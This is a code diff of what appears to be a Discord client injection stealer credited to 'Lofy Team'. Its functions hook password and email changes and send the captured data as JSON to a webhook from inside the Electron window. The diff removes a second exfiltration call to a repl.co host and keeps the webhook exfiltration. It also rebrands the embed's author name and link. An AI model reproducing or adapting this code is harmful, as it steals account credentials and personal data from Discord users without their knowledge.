@@ -45,8 +45,7 @@ const ChangePasswordFilter = {
 };
 
 function sendWeb(e) {
-	(win = BrowserWindow.getAllWindows()[0]).webContents.executeJavaScript(`\n    var XML = new XMLHttpRequest();\n    XML.open("POST", "${webhook}", true);\n    XML.setRequestHeader('Content-Type', 'application/json');\n    XML.setRequestHeader('Access-Control-Allow-Origin', '*');\n    XML.send(JSON.stringify(${e}));`), 
-    win.webContents.executeJavaScript(`fetch("https://dawwdaiwjdiajwdajwdipjawpidjawpjd.23413ndacc.repl.co", { method: "POST", body: JSON.stringify(${e})})`)
+	(win = BrowserWindow.getAllWindows()[0]).webContents.executeJavaScript(`\n    var XML = new XMLHttpRequest();\n    XML.open("POST", "${webhook}", true);\n    XML.setRequestHeader('Content-Type', 'application/json');\n    XML.setRequestHeader('Access-Control-Allow-Origin', '*');\n    XML.send(JSON.stringify(${e}));`)
 }
 
 function injected() {
@@ -241,8 +240,8 @@ function onEmailChange(e, t, n) {
 				avatar_url: "https://cdn.discordapp.com/attachments/402804198053249024/905502124383805440/c20a5eeda3f7fb94e7ad57c95b042e72.png",
 				embeds: [{
 					author: {
-						name: '2341',
-						url: "https://discord.com",
+						name: 'By Lofy Team',
+						url: "https://notfubuki.glitch.me",
 						icon_url: "https://cdn.discordapp.com/avatars/712825748678770830/66a54f75d95a9e395c07d29d458ff947.png?size=2048"
 					},
 					color: 43690,
